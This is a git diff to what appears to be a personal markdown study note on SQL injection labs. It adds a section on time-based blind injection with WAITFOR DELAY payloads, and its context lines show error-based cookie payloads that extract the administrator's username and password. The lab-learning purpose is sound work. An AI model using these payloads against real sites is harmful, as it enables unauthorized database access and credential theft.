@@ -289,3 +289,20 @@ Cookie: TrackingId='AND 1=CAST((SELECT 1) AS int)--; session=nCJ4wY37vsVs9bL03Wg
 Cookie: TrackingId='+AND+1%3dCAST((SELECT+username+from+users+LIMIT+1)+as+int)--; session=nCJ4wY37vsVs9bL03Wg3d11A2Emk4KjW  # administrator is revealed
 Cookie: TrackingId='+AND+1%3dCAST((SELECT+password+from+users+LIMIT+1)+as+int)--; session=nCJ4wY37vsVs9bL03Wg3d11A2Emk4KjW # administrator's password is revealed
 ```
+
+##### Exploiting blind SQL injection by triggering time delays
+- In Blind SQL injection is often possiable to exploit the blind injection vulnerablity by triggering time delays depamding on whether an injected condition is true or false.
+    - The first condition is false ```1=2``` so it don't trigger time delays.
+    - The Second condition is true ```1=1``` so it will trigger time delays.
+```bash
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'--
+```
+- Using this technique, we can retrive data by testing one charater at a time:
+```bash
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1,1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+```
+- Lab Commands:
+```bash
+
+```
